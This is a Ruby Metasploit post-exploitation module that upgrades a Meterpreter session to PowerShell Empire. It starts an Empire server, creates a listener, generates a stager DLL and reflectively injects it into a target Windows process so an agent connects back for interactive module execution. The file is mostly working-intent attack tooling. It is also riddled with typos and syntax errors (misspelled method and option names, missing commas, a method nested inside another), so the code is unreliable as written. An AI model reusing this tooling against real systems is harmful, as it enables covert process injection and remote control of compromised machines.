##
# This module requires Metaspoit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/post/windows/reflective_dll_injection'
require 'msf/core/empire_lib'
class MetasploitModule < Msf::Post
  include Msf::Post::Windows::ReflectiveDLLInjection
  include Msf::Empire

  def initialize(info={})
    super(update_indo(info,
                      "Name"                => "Upgrading to Empire from Meterpreter Post Module",
                      "Description"         => " This module will set up a bridge between the already existing meterpretr session and the Empire instance hosted over the port 1337",
                      "LICENSE"             => MSF_LICENSE,
                      "Platform"            => ["multi"],
                      "SessionTypes"        => ["meterpreter"],
                      "Author"              => ["author"]
                     ))
    register_option(
      [
        OptPort.new('LPORT',[false, 'Port for payload to connect to, make sure port is not already in use', 7878 ])
        OptString.new('PathToEmpire', [true, 'The Complete Path to Empire-Web API']),
        OptInt.new('PID', [true, ,'Process Identifier to inject the Empire payload into'])
      ])
    #run method for when run command is issued
    def run
      #Generating a random number to name the session attributes
      rand_no = rand(1..10000)
      #Make sure that 133 is not being used by another service
      command = "netstat -nlt | grep 1337"
      value = system(command)
      raise "Port 1337 is already in use by foreign service" if value

      #Fetching User inputs
      path = datastore['PathToEmpre'].to_s
      pid = datastore['PID'].to_i
      lport = datastore['LPORT'].to_s

      #Getting username and passowrds for the current session
      user_name = "user#{rand_no}"
      user_pass = "pass#{rand_no}"

      #Initiating the Empire Instance thread with provided username and pass
      command = "cd #{path} && ./empire --headless --username '#{user_name}' --password '#{user_pass}'"
      print_status("Initiating Empire Web-API, this may take upto few seconds")
      server = Thread.new{
        value = system(command)
      }
      sleep(10)

      #Creating the Empire Object
      client_emp = Msf::Empire::Client.new(user_name, user_pass)

      #Creating a random listener which will destroyed after session)
      listener_name = "Listener#{rand_no}"
      response = client_emp.create_listener(listener_name, lport)
      raise reponse.to_s if response.to_s.include?("error")
      print_status(response)

      #Creating the DLL for reflective DLL injection
      payload_path = "/tmp/launcher#{rand_no}.dll"
      print_status("Creating DLL for injection")
      client_emp.gen_stager(listener_name,"launcher/dll", payload_path)

      #Injecting the created DLL payload reflectively in the target process
      host_process = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
      print_status("Injecting #{payload_path} into #{pid}")
      dll_mem, offset = inject_dll_into_process(host_process, payload_path)
      print_status("DLL Injected. Executing Reflective loader")
      host_process.thread.create(dll_mem + offset, 0)
      print_status("DLL injected and invoked")

      #Checking for agents connected after an interval of 6 seconds
      sleep(6)
      agent_name = client_emp.get_agents(true)

      #Interacting with detected agent.
      #Help will list the common commands to be used
      user_command ''
      while user_command != 'switch'
        print "msf-empire > "
        user_command = gets
        case user_command.to_s
        #command to show all the modules available
        when "show modules"
          client_emp.get_modules
        #command to show info of a particular module
        when "show info"
          print"module_name > "
          module_name = gets
          client_emp.info_module(module_name)
        #command execute a module on target
        when "exec_module"
          print "module_name > "
          module_name = gets
          client_emp.exec_module(module_name, agent_name)
        when "help"
          #help method will be created
          help
        end
      end
    end


